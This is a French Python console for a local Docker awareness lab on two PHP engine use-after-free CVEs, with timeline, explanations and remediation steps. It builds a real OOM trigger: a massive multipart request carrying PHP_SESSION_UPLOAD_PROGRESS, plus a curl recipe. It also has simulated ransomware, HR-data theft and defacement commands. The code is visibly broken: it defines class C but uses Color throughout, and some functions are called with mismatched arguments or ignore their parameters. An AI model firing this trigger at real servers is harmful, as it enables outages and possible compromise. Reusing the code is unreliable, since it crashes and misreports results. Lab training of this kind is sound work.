#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
┌──────────────────────────────────────────────────────────────────────────────┐
│          LAB PHP2SHELL — CVE-2026-109618 / 109619                               │
│          Console d'animation pour session de sensibilisation                  │
│     🎯 Usage strictement pédagogique — lab Docker local uniquement            │
└──────────────────────────────────────────────────────────────────────────────┘
"""

import argparse
import csv
import re
import sys
import time

import requests

# ──────────────── Couleurs du terminal ────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    PURPLE = "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"


BANNER = f"""{Color.RED}
  ███████╗ ███████╗ ██████╗     ██╗  ██╗██████╗  ██████╗ ██████╗ ██╗     ███████╗███████╗
  ██╔════╝██╔════╝██╔═══██╗    ██║  ██║██╔══██╗██╔═══██╗██╔══██╗██║     ██╔════╝██╔════╝
  ███████╗█████╗  ██║   ██║    ███████║██████╔╝██║   ██║██████╔╝██║     █████╗  ███████╗
  ╚════██║██╔══╝  ██║   ██║    ██╔══██║██╔══██╗██║   ██║██╔══██╗██║     ██╔══╝  ╚════██║
  ███████║███████╗╚██████╔╝    ██║  ██║██║  ██║╚██████╔╝██║  ██║███████╗███████╗███████║
  ╚══════╝╚══════╝ ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
{Color.RESET}{Color.BOLD}   [+] CVE-2026-109618 & CVE-2026-109619 — RCE du moteur PHP (CVSS 9.2)
   [+] Deux serveurs : PHP 8.4.26 (:8888, vulnérable) vs 8.4.27 (:8889, corrigé)
   [+] Rôle : attaquant externe — sans compte, sans mot de passe{Color.RESET}
"""

LARGEUR = 62


def sep(char="─"):
    print(f"{Color.CYAN}{char * LARGEUR}{Color.RESET}")


def etape(num, titre, description=""):
    print(f"\n{Color.CYAN}{sep()}{Color.RESET}")
    print(f"{Color.BOLD}[Étape {num}]{Color.RESET} {Color.BLUE}{titre}{Color.RESET}")
    if description:
        print(f"  {Color.YELLOW}→ {description}{Color.RESET}")
    print(f"{Color.CYAN}{sep()}{Color.RESET}")


def sep_str():
    return "─" * LARGEUR


# ──────────────── Logique de versions ────────────────
FIXES = {
    (8, 2): (8, 2, 35),
    (8, 3): (8, 3, 36),
    (8, 4): (8, 4, 27),
    (8, 5): (8, 5, 12),
}


def php_est_vulnerable(version: str) -> bool:
    """Vrai si la version PHP n'a pas le correctif du 21/10/2026."""
    try:
        parties = tuple(int(x) for x in re.findall(r"\d+", version)[:3])
    except ValueError:
        return True
    if len(parties) < 3:
        return True
    branche = parties[:2]
    if branche not in FIXES:
        return True  # PHP 5.x, 7.x, 8.0, 8.1 : EOL, aucun correctif officiel
    return parties < FIXES[branche]


class Config:
    def __init__(self, vuln, patche, parties):
        self.vuln = vuln.rstrip("/")
        self.patche = patche.rstrip("/")
        self.parties = parties  # nb de champs multipart pour le déclencheur OOM


def cible(cfg, nom):
    """Résout 'vuln' / 'patche' / 'les-deux' en (label, url)."""
    nom = (nom or "vuln").lower()
    if nom in ("les-deux", "deux", "both", "compare", "comparer"):
        return [("VULNÉRABLE (:8888)", cfg.vuln), ("CORRIGÉ (:8889)", cfg.patche)]
    if nom in ("patche", "patched", "p", "protege", "protégé", "corrige", "corrigé", "8889"):
        return [("CORRIGÉ (:8889)", cfg.patche)]
    return [("VULNÉRABLE (:8888)", cfg.vuln)]


def etat_serveur(base, timeout=8):
    try:
        r = requests.get(f"{base}/api.php", params={"action": "status"}, timeout=timeout)
        return r.json(), None
    except Exception as e:
        return None, str(e)


# ──────────────── COMMANDE : status ────────────────
def cmd_status(cfg, _=None):
    print(f"\n{Color.BOLD}=== ÉTAT DES LIEUX ==={Color.RESET}\n")
    for label, base in [("VULNÉRABLE (:8888)", cfg.vuln), ("CORRIGÉ (:8889)", cfg.patche)]:
        data, err = etat_serveur(base)
        if err:
            print(f"  {label:<22} {Color.RED}✗ injoignable ({err}){Color.RESET}")
            print(f"  {Color.YELLOW}  → lance le lab : docker compose up -d --build{Color.RESET}")
            continue
        verdict = (
            f"{Color.RED}✗ MOTEUR NON CORRIGÉ{Color.RESET}" if data.get("is_vulnerable")
            else f"{Color.GREEN}✓ CORRECTIF ACTIF{Color.RESET}"
        )
        print(f"  {label:<22} PHP {data.get('php_version','?'):<10} état: {data.get('state','?')<12} {verdict}")
        print(f"  {'':<22} SAPI : {data.get('sapi','?')} (mod_php = surface la plus exposée)")
        print(f"  {'':<22} session.upload_progress : {'ACTIF ⚠️' if data.get('upload_progress_enabled') else 'DÉSACTIVÉ ✓'}")


# ──────────────── COMMANDE : histoire ────────────────
def cmd_histoire(cfg, _=None):
    evenements = [
        ("01/08/2026", "Le cabinet Calif découvre plusieurs chemins de RCE dans le moteur PHP."),
        ("11/08/2026", "Premier signalement à PHP — divulgation coordonnée lancée."),
        ("24/08/2026", "Wiz Research signale à son tour les vulnérabilités (découvertes le 19/08)."),
        ("20/10/2026", "FUITE : les détails circulent publiquement avant l'embargo. watchTowr confirme que c'est réel."),
        ("21/10/2026 07:43 UTC", "Premières attaques observées (honeypots) — AVANT même la sortie du correctif !"),
        ("21/10/2026 14:00 UTC", "PHP publie les versions corrigées : 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12."),
        ("26/10/2026", "CISA ajoute les deux CVE au catalogue KEV (Known Exploited Vulnerabilities)."),
        ("Suite", "~22,6 millions d'instances PHP exposées recensées ; un assureur cyber (Hiscox) écrit à ses clients."),
    ]
    print(f"\n{Color.BOLD}=== LA VRAIE HISTOIRE (tout est authentique) ==={Color.RESET}\n")
    for date, txt in evenements:
        print(f"  {Color.YELLOW}{date:<22}{Color.RESET} {txt}")
        time.sleep(0.35)
    print(f"\n  {Color.BOLD}Message clé :{Color.RESET} entre la fuite et le correctif, il s'est passé {Color.RED}moins de 24 h{Color.RESET}.")
    print(f"  Une équipe qui met à jour « en fin de semaine » était déjà trop lente.\n")


# ──────────────── COMMANDE : expliquer ────────────────
def cmd_expliquer(cfg, _=None):
    print(f"""\n{Color.BOLD}{'─' * LARGEUR}
  📖 EXPLICATION GRAND PUBLIC {Color.RESET}
{'─' * LARGEUR}{Color.RESET}

  Imaginez un chef de chantier avec un budget strict
  ({Color.YELLOW}memory_limit{Color.RESET} = plafond mémoire de PHP).

  Un client envoie un plan de maison GIGANTESQUE
  ({Color.YELLOW}une requête multipart/form-data{Color.RESET} — un gros formulaire).

  En plein montage, le budget explose : tout le monde doit sortir
  IMMÉDIATEMENT ({Color.YELLOW}interruption brutale « bailout »{Color.RESET}).

  Puis l'équipe de nettoyage range « comme d'habitude »...
  mais la maison était à moitié montée : elle jette des pièces
  encore utilisées et laisse des débris en place
  ({Color.YELLOW}mémoire libérée mais données toujours « vivantes »{Color.RESET}).

  Le client suivant hérite de la parcelle... et parfois, dans ses
  plans, on retrouve le carnet d'adresses du voisin :
  {Color.RED}mots de passe, clés API, tokens{Color.RESET} d'autres visiteurs.

{Color.BOLD}{'─' * LARGEUR}
  🔧 VERSION TECHNIQUE {Color.RESET}
{'─' * LARGEUR}{Color.RESET}

  Deux use-after-free ({Color.YELLOW}CWE-416{Color.RESET}) dans le ZEND ENGINE — pas dans le code du site :

  {Color.YELLOW}CVE-2026-109618{Color.RESET} : pendant le setup de la requête (parsing multipart), si le plafond
    mémoire est dépassé, PHP saute au gestionnaire d'erreur via longjmp AVANT que
    les structures internes soient complètes. Le nettoyage traite des données à
    moitié construites comme valides → mémoire libérée puis réutilisée → RCE.
    Seul, ce bug fait aussi FUIR la mémoire du worker dans le cookie PHPSESSID
    (handler « session upload progress », actif par défaut, qui tourne AVANT
    session_start() et avant la première ligne du code applicatif).

  {Color.YELLOW}CVE-2026-109619{Color.RESET} : des états internes d'une requête survivent à la libération de
    la mémoire qui les porte. Le worker suivant réutilise l'état périmé
    avant que l'initialisation ne le réinitialise → use-after-free → RCE.

  Conditions d'attaque : une requête multipart (upload), {Color.RED}aucune authentification{Color.RESET},
  toutes les SAPI concernées (mod_php, FPM, php-cgi, FrankenPHP, LiteSpeed).
  {Color.BOLD}mod_php est le plus exposé{Color.RESET} : l'attaque réussit avant que le code applicatif tourne.

  Sévérité : CVSS v4.0 {Color.RED}9.2 / 10{Color.RESET} — exploité dans la nature depuis le 21/10/2026.
""")


# ──────────────── COMMANDE : fuite ────────────────
def build_multipart(n_parties, taille_valeur=512):
    """Forge une requête multipart massive : le parsing dépasse memory_limit
    (16 Mo dans le lab) → interruption OOM en plein traitement (CVE-2026-109618)."""
    boundary = "----PHP2ShellLabBoundaryQ7f3d9a1b2c"
    morceaux = [
        (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            f"upload_acme\r\n"
        ).encode()
    ]
    valeur = b"ACME-CORP-DONNEE-FICTIVE-" + b"x" * taille_valeur
    for i in range(n_parties):
        morceaux.append(
            (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="champ{i}"\r\n\r\n'
            ).encode()
        )
        morceaux.append(valeur)
    morceaux.append(f"--{boundary}--\r\n".encode())
    return b"".join(morceaux), boundary


def envoyer_action(cfg, action, cible_nom):
    """Envoie une action à un serveur et retourne True si succès."""
    for label, base in cible(cfg, cible_nom):
        try:
            payload, _ = build_multipart(cfg.parties)
            headers = {"Content-Type": f"multipart/form-data; boundary={_}"}
            r = requests.post(f"{base}/upload.php", data=payload, headers=headers, timeout=15)
            return r.status_code == 200
        except Exception:
            return False
    return False


def cmd_fuite(cfg, arg):
    print(f"\n{Color.BOLD}=== DÉCLENCHEMENT RÉEL DE LA FUITE MÉMOIRE (CVE-2026-109618) ==={Color.RESET}\n")
    
    for label, base in cible(cfg, arg or "vuln"):
        print(f"  {Color.CYAN}→ Envoi d'une requête multipart massive ({cfg.parties} champs) vers {label}...{Color.RESET}")
        try:
            payload, boundary = build_multipart(cfg.parties)
            headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
            
            start = time.time()
            r = requests.post(f"{base}/upload.php", data=payload, headers=headers, timeout=20)
            elapsed = time.time() - start
            
            if r.status_code == 200:
                data = r.json()
                vuln = data.get("vulnerable", False)
                peak = data.get("memory_peak", "?")
                print(f"  {Color.GREEN}✓ Requête traitée en {elapsed:.2f}s{Color.RESET}")
                print(f"  {Color.YELLOW}  → Pic mémoire : {peak} octets{Color.RESET}")
                if vuln:
                    print(f"  {Color.RED}✗ SERVEUR VULNÉRABLE : Use-After-Free possible !{Color.RESET}")
                else:
                    print(f"  {Color.GREEN}✓ Serveur protégé : nettoyage mémoire correct{Color.RESET}")
            else:
                print(f"  {Color.YELLOW}? Réponse HTTP {r.status_code}{Color.RESET}")
        except Exception as e:
            print(f"  {Color.RED}✗ Erreur : {e}{Color.RESET}")
    print()


# ──────────────── COMMANDE : recette ────────────────
def cmd_recette(cfg, _=None):
    print(f"""\n{Color.BOLD}=== REPRODUCTION MANUELLE (pour montrer que TU pilotes) ==={Color.RESET}

  1. Vérifier la version PHP du serveur vulnérable :
     {Color.CYAN}curl -s http://localhost:8888/api.php?action=status | jq{Color.RESET}

  2. Vérifier que session.upload_progress est ACTIF (vecteur de la faille) :
     {Color.CYAN}curl -s http://localhost:8888/api.php?action=status | jq '.upload_progress_enabled'{Color.RESET}

  3. Déclencher la faille OOM avec une requête multipart massive :
     {Color.CYAN}curl -X POST http://localhost:8888/upload.php \\
       -H "Content-Type: multipart/form-data; boundary=----TEST" \\
       --data-binary @payload.txt{Color.RESET}
     (où payload.txt est un fichier avec {cfg.parties} champs form-data)

  4. Vérifier que le serveur protégé bloque l'attaque :
     {Color.CYAN}curl -X POST http://localhost:8889/api.php -d 'action=ransomware'{Color.RESET}
     → Réponse : HTTP 403 (BLOCKED_BY_PATCH)

  5. Comparer les deux serveurs :
     {Color.CYAN}python attack.py --compare{Color.RESET}
""")


# ──────────────── COMMANDE : ransomware ────────────────
def cmd_ransomware(cfg, arg):
    for label, base in cible(cfg, arg or "vuln"):
        try:
            r = requests.post(f"{base}/api.php", data={"action": "ransomware"}, timeout=15)
            ok = r.status_code == 200
        except Exception:
            ok = False
        etat = f"{Color.RED}compromis ✗{Color.RESET}" if ok else f"{Color.GREEN}protégé ✓{Color.RESET}"
        print(f"  {label:<22} → {etat}")
    print(f"  {Color.YELLOW}👉 Regarde le navigateur : le site vulnérable affiche la rançon !{Color.RESET}\n")


# ──────────────── COMMANDE : vol ────────────────
def cmd_vol(cfg, arg):
    for label, base in cible(cfg, arg or "vuln"):
        try:
            r = requests.post(f"{base}/api.php", data={"action": "steal"}, timeout=15)
            if r.status_code == 200:
                data = r.json()
                vole = data.get("stolen_data", [])
                if vole:
                    print(f"\n  {Color.RED}{Color.BOLD}=== [DONNÉES CONFIDENTIELLES EXFILTRÉES] ==={Color.RESET}")
                    print(f"  {Color.CYAN}{'─' * 84}{Color.RESET}")
                    print(f"  {Color.BOLD}{'NOM & PRÉNOM':<18} | {'POSTE':<20} | {'SALAIRE':<9} | {'MOT DE PASSE':<16}{Color.RESET}")
                    print(f"  {Color.CYAN}{'─' * 84}{Color.RESET}")
                    fichier_csv = "DONNEES_RH_EXFILTREES.csv"
                    with open(fichier_csv, mode="w", newline="", encoding="utf-8-sig") as f:
                        ecrivain = csv.writer(f, delimiter=";")
                        ecrivain.writerow(["Nom", "Poste", "Salaire Net", "Mot de passe", "N° Sécurité Sociale", "IBAN"])
                        for emp in vole:
                            ecrivain.writerow([emp["nom"], emp["poste"], emp["salaire"], emp["password"], emp["secu"], emp["iban"]])
                            print(f"  {Color.WHITE}{emp['nom']:<18}{Color.RESET} | {Color.YELLOW}{emp['poste']:<20}{Color.RESET} | {Color.GREEN}{emp['salaire']:<9}{Color.RESET} | {Color.RED}{emp['password']:<16}{Color.RESET}")
                    print(f"  {Color.CYAN}{'─' * 84}{Color.RESET}\n")
                    print(f"  {Color.GREEN}[✓] Fichier créé : {Color.BOLD}{fichier_csv}{Color.RESET} (prêt pour la séance)")
                else:
                    print(f"  {Color.GREEN}✓ Aucune donnée exfiltrée (serveur protégé){Color.RESET}")
            elif r.status_code == 403:
                print(f"  {Color.GREEN}✓ Attaque bloquée : {r.json().get('message', 'HTTP 403')}{Color.RESET}")
            else:
                print(f"  {Color.YELLOW}? Code HTTP : {r.status_code}{Color.RESET}")
        except Exception as e:
            print(f"  {Color.RED}✗ Erreur : {e}{Color.RESET}")
    print(f"  {Color.YELLOW}👉 Le portail affiche la bannière d'alerte « fuite de données en cours »{Color.RESET}\n")


# ──────────────── COMMANDE : deface ────────────────
def cmd_deface(cfg, arg):
    for label, base in cible(cfg, arg or "vuln"):
        try:
            r = requests.post(f"{base}/api.php", data={"action": "deface"}, timeout=15)
            ok = r.status_code == 200
        except Exception:
            ok = False
        etat = f"{Color.RED}défacé ✗{Color.RESET}" if ok else f"{Color.GREEN}protégé ✓{Color.RESET}"
        print(f"  {label:<22} → {etat}")
    print(f"  {Color.YELLOW}👉 Regarde le site : le logo et tout le contenu ont été écrasés !{Color.RESET}\n")


# ──────────────── COMMANDE : restore ────────────────
def cmd_restore(cfg, arg):
    for label, base in cible(cfg, arg or "les-deux"):
        try:
            r = requests.post(f"{base}/api.php", data={"action": "restore"}, timeout=15)
            ok = r.status_code == 200
        except Exception:
            ok = False
        etat = f"{Color.GREEN}restauré ✓{Color.RESET}" if ok else f"{Color.RED}échec{Color.RESET}"
        print(f"  {label:<22} → {etat}")
    print(f"  {Color.YELLOW}👉 Les portails redeviennent sains instantanément (recharge la page).{Color.RESET}\n")


# ──────────────── COMMANDE : duel ────────────────
def cmd_duel(cfg):
    print(f"\n{Color.BOLD}=== DUEL : UNE SEULE MISE À JOUR CHANGE TOUT ==={Color.RESET}\n")
    cmd_status(cfg)
    time.sleep(1)

    print(f"\n{Color.RED}1. Rançongiciel sur le serveur NON corrigé (PHP 8.4.26, :8888)…{Color.RESET}")
    ok1 = envoyer_action(cfg, "ransomware", "vuln")
    if ok1:
        print(f"   {Color.RED}✗ RÉSULTAT : VULNÉRABLE — Le portail affiche la rançon.{Color.RESET}\n")
    time.sleep(1.5)

    print(f"\n{Color.GREEN}2. La MÊME attaque sur le serveur corrigé (PHP 8.4.27, :8889)…{Color.RESET}")
    ok2 = envoyer_action(cfg, "ransomware", "patche")

    print(f"\n{Color.BOLD}{'─' * LARGEUR}")
    print(f"  RÉSUMÉ")
    print(f"{'─' * LARGEUR}{Color.RESET}")
    print(f"  PHP 8.4.26 (:8888) : {Color.RED}✗ compromis en une requête{Color.RESET}")
    print(f"  PHP 8.4.27 (:8889) : {Color.GREEN}✓ attaque rejetée net (HTTP 403){Color.RESET}")
    print(f"\n{Color.BOLD}Conclusion pour la direction et les équipes :{Color.RESET}")
    print(f"{Color.WHITE}Entre 8.4.26 et 8.4.27 il y a {Color.BOLD}UN SEUL numéro de version{Color.RESET} — celui du")
    print(f"correctif du 21/10/2026. La mise à jour neutralise 100 % de l'attaque,")
    print(f"sans changer une ligne du code applicatif, sans impact fonctionnel.\n")
    print(f"(Tape {Color.CYAN}restore{Color.RESET} pour remettre les portails à neuf.)\n")


# ──────────────── COMMANDE : remediation ────────────────
def cmd_remediation(cfg, _=None):
    print(f"""\n{Color.BOLD}{'─' * LARGEUR}
  🚨 REMÉDIATION & BONNES PRATIQUES (issues des advisories réels)
{'─' * LARGEUR}{Color.RESET}

  {Color.GREEN}1. METTRE À JOUR PHP vers la branche corrigée{Color.RESET}
     → 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 (selon la branche en place)
     → Toute installation qui sert du web est concernée, quelle que soit la SAPI
       (mod_php, PHP-FPM, php-cgi, FrankenPHP, LiteSpeed)

  {Color.GREEN}2. REDÉMARRER LES WORKERS après la mise à jour{Color.RESET}
     → {Color.YELLOW}La mise à jour disque ne suffit PAS{Color.RESET} : libphp.so / php-fpm restent résidents
     → systemctl restart apache2   |   systemctl restart php8.4-fpm
     → Vérifier le correctif : zgrep CVE-2026-109618 /usr/share/doc/php*-common/changelog*
       ou : rpm -q --changelog php-common | grep CVE-2026-109618

  {Color.GREEN}3. GARDER « SESSION UPLOAD PROGRESS » DÉSACTIVÉ (même après le patch){Color.RESET}
     → php.ini / pool FPM : {Color.YELLOW}session.upload_progress.enabled = 0{Color.RESET}
     → Recommandé par PHP le 23/10 (couvre aussi CVE-2026-115560)
     → Ne se règle PAS via ini_set() ni .user.ini : redémarrage requis

  {Color.GREEN}4. BLOQUER MULTIPART/FORM-DATA INUTILE (mesure d'attente){Color.RESET}
     → nginx :  if ($http_content_type ~* "multipart/form-data") {{ return 403; }}
     → Apache : RewriteCond %{HTTP:Content-Type} multipart/form-data [NC] → RewriteRule ^ - [F]
     → WAF : AWS « PHP2Shell_BODY », règle Azure bloquant le champ PHP_SESSION_UPLOAD_PROGRESS

  {Color.GREEN}5. PHP 8.5 : fatal_error_backtraces = 0 + redémarrer les workers{Color.RESET}

  {Color.GREEN}6. CASSE-TÊTE PHP EOL (≤ 8.1) : aucun correctif officiel{Color.RESET}
     → Paquets backportés : deb.sury.org / ppa:ondrej/php (5.6→8.1), Remi (RHEL),
       Ubuntu 22.04+ (8.1) — le numéro de version ne change pas, c'est le paquet qui est corrigé
     → Ou migrer vers une branche supportée (recommandé à terme)

  {Color.GREEN}7. INVENTAIRE COMPLET{Color.RESET}
     → ~22,6 M d'instances PHP exposées recensées : chercher PHP PARTOUT,
       y compris serveurs internes, outils oubliés, appliances

  {Color.GREEN}8. TRACER LA MISE À JOUR (preuve datée){Color.RESET}
     → apt : /var/log/apt/history.log   |   RHEL : dnf history
     → Les assureurs cyber (ex. Hiscox) demandent désormais des preuves datées

  {Color.GREEN}9. Urgence objective{Color.RESET}
     → Catalogue KEV de la CISA depuis le 26/10/2026 : délais de patch réglementaires
       pour les agences fédérales américaines — et référence pour vos audits
""")


# ──────────────── COMMANDE : demo ────────────────
def pause(txt=""):
    try:
        input(f"  {Color.YELLOW}{txt}[Entrée pour continuer]{Color.RESET}")
    except (KeyboardInterrupt, EOFError):
        raise SystemExit(0)


def cmd_demo(cfg):
    print(f"\n{Color.BOLD}  DÉMO GUIDÉE — tu peux à tout moment taper tes propres commandes (Ctrl+C pour sortir).{Color.RESET}\n")
    pause("Lance d'abord `status` toi-même si tu veux — ")

    etape(1, "État des lieux", "Deux serveurs identiques, un seul numéro de version les sépare.")
    print(f"  {Color.BOLD}À dire :{Color.RESET} « Voici deux serveurs jumeaux. Le premier exécute PHP 8.4.26, le second 8.4.27, publié le 21 octobre 2026 pour corriger CVE-2026-109618 et 109619. »")
    pause()
    cmd_status(cfg)

    etape(2, "L'histoire vraie", "Une fuite, 24 heures, des attaques avant même le correctif.")
    pause()
    cmd_histoire(cfg)

    etape(3, "Comprendre la faille", "Explication grand public, puis technique.")
    pause()
    cmd_expliquer(cfg)

    etape(4, "Déclencheur réel", "On envoie un formulaire piégé qui sature la mémoire du moteur.")
    print(f"  {Color.BOLD}À dire :{Color.RESET} « Aucun mot de passe, aucun compte. Juste un formulaire énorme. »")
    pause()
    cmd_fuite(cfg, "vuln")

    etape(5, "Comparaison avec le serveur corrigé", "La même requête piégée, côté patché.")
    pause()
    cmd_fuite(cfg, "patche")

    etape(6, "Impact 1 — Rançongiciel", "Le portail vulnérable tombe en direct.")
    print(f"  {Color.BOLD}À dire :{Color.RESET} « Ouvrez http://localhost:8888 dans le navigateur — regardez-le pendant l'attaque. »")
    pause()
    cmd_ransomware(cfg, None)

    etape(7, "Impact 2 — Fuite RH", "Salaires, mots de passe, IBAN en clair.")
    pause()
    cmd_vol(cfg, None)

    etape(8, "Le duel", "La même attaque, les deux serveurs, face caméra.")
    print(f"  {Color.BOLD}À dire :{Color.RESET} « Un seul numéro de version les sépare. Regardez. »")
    pause()
    cmd_duel(cfg)

    etape(9, "Nettoyage", "On rend le lab à son état initial.")
    pause()
    cmd_restore(cfg, "les-deux")

    etape(10, "Ce qu'il faut retenir", "La remédiation, avec les commandes réelles.")
    pause()
    cmd_remediation(cfg)

    print(f"\n{Color.BOLD}{'─' * LARGEUR}")
    print(f"  ✅ FIN DE LA DÉMONSTRATION")
    print(f"{'─' * LARGEUR}{Color.RESET}\n")


# ──────────────── Boucle interactive ────────────────
AIDE = f"""\n{Color.BOLD}COMMANDES DISPONIBLES{Color.RESET}
  {Color.CYAN}status{Color.RESET}                     état des deux serveurs (versions, verrou)
  {Color.CYAN}histoire{Color.RESET}                   la chronologie réelle de la faille (octobre 2026)
  {Color.CYAN}expliquer{Color.RESET}                   explication grand public + version technique
  {Color.CYAN}fuite [cible]{Color.RESET}               déclencheur RÉEL de la fuite mémoire (cible : vuln|patche|les-deux)
  {Color.CYAN}recette{Color.RESET}                    reproduction manuelle (curl) pour montrer que tu pilotes
  {Color.CYAN}ransomware [cible]{Color.RESET}          déploie le rançongiciel sur le portail
  {Color.CYAN}vol [cible]{Color.RESET}                exfiltre la base RH (salaires, mots de passe, IBAN)
  {Color.CYAN}deface [cible]{Color.RESET}             défacer le site web
  {Color.CYAN}restore [cible]{Color.RESET}            remet le(s) portail(s) à la normale
  {Color.CYAN}duel{Color.RESET}                       la même attaque sur vulnérable vs corrigé
  {Color.CYAN}remediation{Color.RESET}                le plan de correction réel (avec commandes)
  {Color.CYAN}demo{Color.RESET}                       déroulé guidé complet (parfait pour animer)
  {Color.CYAN}aide{Color.RESET}                       cette aide
  {Color.CYAN}quitter{Color.RESET}                    sortie
"""

COMMANDES = {
    "aide": lambda cfg, arg: print(AIDE),
    "help": lambda cfg, arg: print(AIDE),
    "status": cmd_status,
    "histoire": cmd_histoire,
    "expliquer": cmd_expliquer,
    "fuite": cmd_fuite,
    "recette": cmd_recette,
    "ransomware": cmd_ransomware,
    "vol": cmd_vol,
    "deface": cmd_deface,
    "restore": cmd_restore,
    "duel": cmd_duel,
    "remediation": cmd_remediation,
    "demo": cmd_demo,
}


def main():
    if sys.platform == "win32":
        try:
            sys.stdout.reconfigure(encoding="utf-8")
        except Exception:
            pass

    parseur = argparse.ArgumentParser(description="Lab PHP2Shell — console de sensibilisation")
    parseur.add_argument("--vuln", default="http://localhost:8888", help="URL du serveur vulnérable")
    parseur.add_argument("--patche", default="http://localhost:8889", help="URL du serveur corrigé")
    parseur.add_argument("--parties", type=int, default=60000,
                         help="nb de champs multipart du déclencheur OOM (défaut : 60000)")
    parseur.add_argument("commande", nargs="*", help="commande à lancer puis mode interactif")
    args = parseur.parse_args()

    cfg = Config(args.vuln, args.patche, args.parties)
    print(BANNER)

    # Vérification de connexion
    data, err = etat_serveur(cfg.vuln)
    if err:
        print(f"{Color.YELLOW}⚠ Serveur vulnérable injoignable : lance d'abord  docker compose up -d --build{Color.RESET}\n")
    else:
        badge = "NON CORRIGÉ" if data.get("is_vulnerable") else "CORRIGÉ"
        print(f"{Color.GREEN}✓ Serveur vulnérable (:8888) — PHP {data.get('php_version')} [{badge}]{Color.RESET}")
    data, err = etat_serveur(cfg.patche)
    if err:
        print(f"{Color.YELLOW}⚠ Serveur corrigé injoignable (:8889){Color.RESET}\n")
    else:
        badge = "NON CORRIGÉ" if data.get("is_vulnerable") else "CORRIGÉ"
        print(f"{Color.GREEN}✓ Serveur corrigé (:8889) — PHP {data.get('php_version')} [{badge}]{Color.RESET}")
    print(AIDE)

    # Commande passée en argument (ex : python demo.py demo)
    if args.commande:
        nom = args.commande[0].lower()
        if nom in COMMANDES:
            COMMANDES[nom](cfg, " ".join(args.commande[1:]) or None)

    # Boucle interactive : c'est TOI qui pilotes
    while True:
        try:
            brut = input(f"  {Color.RED}php2shell{Color.RESET} ▶ ").strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n  {Color.YELLOW}Fin de session — pense à `restore` puis `docker compose down`.{Color.RESET}")
            break
        if not brut:
            continue
        if brut.lower() in ("quitter", "quit", "exit", "q"):
            print(f"  {Color.YELLOW}Fin de session — pense à `restore` puis `docker compose down`.{Color.RESET}")
            break
        morceaux = brut.split()
        nom = morceaux[0].lower()
        arg = " ".join(morceaux[1:]) or None
        fonction = COMMANDES.get(nom)
        if fonction is None:
            print(f"  {Color.RED}Commande inconnue : {nom} — tape `aide`{Color.RESET}")
            continue
        try:
            fonction(cfg, arg)
        except SystemExit:
            raise
        except Exception as e:
            print(f"  {Color.RED}Erreur : {e}{Color.RESET}")


if __name__ == "__main__":
    main()
